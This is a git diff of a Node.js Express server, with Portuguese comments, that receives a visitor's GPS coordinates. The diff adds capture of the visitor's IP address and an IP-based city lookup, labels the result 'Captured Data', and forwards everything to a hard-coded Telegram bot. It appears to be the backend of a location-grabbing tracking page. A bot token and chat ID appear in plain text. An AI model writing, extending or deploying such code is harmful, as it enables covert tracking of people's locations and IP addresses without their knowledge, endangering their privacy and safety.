@@ -1,4 +1,3 @@
-// server.js
 const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
@@ -8,25 +7,36 @@ const app = express();
 app.use(cors());
 app.use(bodyParser.json());
 
-const TELEGRAM_BOT_TOKEN = "8592193749:AAHCEHrIpY8Yz6EaEyMg2-ClFNbA5iCXvcs"; // Substitua pelo token do seu bot
-const TELEGRAM_CHAT_ID = "8544555619"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar
+const TELEGRAM_BOT_TOKEN = "8592193749:AAHCEHrIpY8Yz6EaEyMg2-ClFNbA5iCXvcs";
+const TELEGRAM_CHAT_ID = "8544555619";
 
 app.post("/send-location", async (req, res) => {
   const { latitude, longitude, maps } = req.body;
+  const userIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
 
-  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;
+  let ipCity = "N/A";
+  try {
+    const ipResponse = await axios.get(`http://ip-api.com/json/${userIp}`);
+    ipCity = ipResponse.data.city || "N/A";
+  } catch (err) {
+    console.error("Erro ao buscar IP API");
+  }
+
+  const message = `Dados Capturados:\n` +
+                  `IP: ${userIp}\n` +
+                  `Cidade (IP): ${ipCity}\n` +
+                  `GPS Latitude: ${latitude || "Negado"}\n` +
+                  `GPS Longitude: ${longitude || "Negado"}\n` +
+                  `Maps: ${maps || "N/A"}`;
 
   try {
-    // Envia a localização para o Telegram
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       chat_id: TELEGRAM_CHAT_ID,
       text: message,
     });
-
     res.status(200).json({ success: true });
   } catch (error) {
-    console.log(error);
-    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
+    res.status(500).json({ success: false });
   }
 });
 
